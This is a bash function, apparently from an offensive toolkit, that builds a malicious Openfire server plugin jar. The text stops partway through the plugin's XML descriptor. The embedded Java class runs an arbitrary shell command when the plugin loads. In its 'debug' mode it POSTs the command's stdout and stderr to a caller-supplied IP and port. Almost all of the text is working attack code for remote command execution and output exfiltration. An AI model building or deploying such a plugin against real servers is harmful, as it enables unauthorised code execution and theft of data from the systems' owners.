function build_jar() {

    local java_version=8
    local jar_name=$(gen_random_num -length 18)
    local class_name="CodeExec"
    local working_dir="/tmp/jar_plugin"
    local dont_clean=""

while [[ "$#" -gt 0 ]]; do
    case "$1" in

	-java_version) local java_version="$2"; shift ;;

	-command) 
		shift
		while [[ "$#" -gt 0 ]]; do
		    case "$1" in
		        -cmd) local cmd="$2"; shift ;;
		        -shell) local shell="$2"; shift ;;
		        -switch) local switch="$2"; shift ;;
		        *) set -- "$1" "$@"; break ;;
		    esac
		    shift
		 done ;;

 	 -debug)
		local debug="true" 
		shift
		while [[ "$#" -gt 0 ]]; do
		    case "$1" in
		        -ip) local ip="$2"; shift ;;
		        -port) local port="$2"; shift ;;
		        *) set -- "$1" "$@"; break ;;
		    esac
		    shift
		 done ;;

	-jar_name) jar_name="$2"; shift ;;
	-class_name) class_name="$2"; shift ;;
	-working_dir) working_dir="$2/jar_plugin"; shift ;;
	-dont_clean) dont_clean="true" ;;
	-print_java_code) local print_java_code="true" ;;
	*) echo "Unknown parameter: $1" ;;
    esac
    [ "$#" -gt 0 ] && shift

done 


local java_code="\
import org.jivesoftware.openfire.container.Plugin;
import org.jivesoftware.openfire.container.PluginManager;
import java.io.*;
import java.net.*;
import java.util.Base64;

public class $class_name implements Plugin {


    public static String GetString(InputStream stream) throws IOException {

            byte[] lst_byte = new byte[1];
            int size = 0;
            int b;

            while ((b = stream.read()) != -1) {

                if (size >= lst_byte.length) {

                    byte[] new_lst_byte = new byte[lst_byte.length + 1];

                    for (int x = 0; x < lst_byte.length; x++) {
                        new_lst_byte[x] = lst_byte[x];
                    }

                    lst_byte = new_lst_byte;


                }

                lst_byte[size] = (byte) b;
                size++;



            }

            return new String(lst_byte, 0, size, \"UTF-8\");




    }

        public static void Send_Res(String[] output) throws Exception {


        Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(\"${ip:-}\", ${port:-1}));
        URL url = new URL(\"http://${ip:-}\");
        HttpURLConnection conn = (HttpURLConnection) url.openConnection(proxy);

	conn.setConnectTimeout(5000);  // 5 seconds → timeout for TCP connect
        conn.setReadTimeout(5000);     // 5 seconds → timeout for reading response

        conn.setRequestMethod(\"POST\");
        conn.setDoOutput(true);
        conn.setRequestProperty(\"Content-Type\", \"text/plain\");
        

        char[] chars = new char[50];
        java.util.Arrays.fill(chars, '-');
        String delimiter = new String(chars);
        String stdout_delimiter = delimiter + \"STDOUT\" + delimiter + \"\n\n\";
        String stderr_delimiter = \"\n\n\" + delimiter + \"STDERR\" + delimiter + \"\n\n\"; 


        String body = stdout_delimiter + output[0] + stderr_delimiter + output[1];
        OutputStream os = conn.getOutputStream();
        os.write(body.getBytes(\"UTF-8\"));
        os.flush();
        os.close();

        int responseCode = conn.getResponseCode();

        conn.disconnect();

    }

    public void initializePlugin(PluginManager manager, File pluginDirectory) {

        String debug = \"${debug:-}\";
	String[] cmd = {\"$shell\", \"$switch\", \"$cmd\"};

        try {
            Process process = Runtime.getRuntime().exec(cmd);

            if  (debug == \"true\") {

                InputStream stdout = process.getInputStream();
                InputStream stderr = process.getErrorStream();

                String stdout_str = GetString(stdout);
                String stderr_str = GetString(stderr);

                Send_Res(new String[] {stdout_str, stderr_str});

            }

        } catch (Exception e) {

           System.out.println(e.toString()); 
        }
    }

    public void destroyPlugin() {}
}"


local plugin_xml=\
"<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<plugin>
  <class>$class_name</class>
  <name>$jar_name</name>
  <version>1.0.0</version>
  <description>Code Execution plugin</description>
